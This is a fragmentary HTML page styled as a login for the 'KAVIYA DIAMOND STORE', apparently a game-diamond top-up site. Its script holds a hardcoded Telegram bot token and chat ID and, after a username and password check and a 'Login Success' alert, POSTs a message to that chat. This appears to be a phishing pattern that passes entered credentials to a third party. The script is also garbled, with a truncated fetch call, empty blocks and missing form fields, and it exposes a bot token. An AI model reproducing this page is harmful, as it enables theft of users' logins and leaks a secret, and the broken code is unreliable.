<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>KAVIYA ADMIN</title>

<style>
body{
margin:0;
font-family:Arial;
background:linear-gradient(to bottom,#0f2027,#203a43,#2c5364);
color:white;
text-align:center;
padding:30px;
}

/* ANIMATED FRAME */
body::before{
content:"";
position:fixed;
top:5px; bottom:5px; left:5px; right:5px;
border-radius:20px;
border:4px solid;
animation: frameColor 4s infinite;
pointer-events:none;
}

@keyframes frameColor{
0%{border-color:green;}
25%{border-color:blue;}
50%{border-color:red;}
75%{border-color:yellow;}
100%{border-color:green;}
}

.store-title{
font-size:28px;
font-weight:900;
letter-spacing:3px;
text-transform:uppercase;
animation: colorChange 3s infinite alternate;
margin-bottom:10px;
}

.delivery{
font-size:16px;
margin-bottom:25px;
color:#ffffffcc;
}

.main-title{
font-size:42px;
font-weight:900;
letter-spacing:4px;
color:white;
text-transform:uppercase;
text-shadow:
0 0 5px #ffffff,
0 0 10px #00c6ff,
0 0 20px #00c6ff,
0 0 40px #00c6ff;
margin-bottom:20px;
}

@keyframes colorChange{
0%{color:#00c6ff;}
50%{color:#00ffcc;}
100%{color:#00c6ff;}
}

input{
width:80%;
padding:14px;
margin:10px;
border:none;
border-radius:12px;
font-size:16px;
}

.showbtn{
padding:10px 20px;
border:none;
border-radius:10px;
background:#555;
color:white;
margin-top:5px;
}

button{
width:90%;
padding:16px;
margin:12px;
border:none;
border-radius:14px;
font-size:17px;
font-weight:bold;
}

.loginbtn{
background:#00ff99;
color:black;
}

.topup{
background:#00c6d7;
color:black;
}

.contact{
background:transparent;
border:2px solid white;
color:white;
}

.footer-text{
margin-top:10px;
font-size:14px;
color:#00ffcc;
font-weight:bold;
}
</style>
</head>
<body>

<div class="store-title">KAVIYA DIAMOND STORE</div>

<div class="footer-text">Sri Lanka No 1 Diamond Seller</div>

<script>

const BOT_TOKEN = "8354788016:AAGLqmAbGVCMYcx_UK7cIMAewaRaGdQNO-w";
const CHAT_ID = "8324590734";

let loggedIn = false;

pw.type = (pw.type === "password") ? "text" : "password";

if(username === "" || password === ""){

}

loggedIn = true;
alert("Login Success");

method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
chat_id:CHAT_ID,
text:message
})
});
}

function goTopup(){
if(!loggedIn){

}

</script>
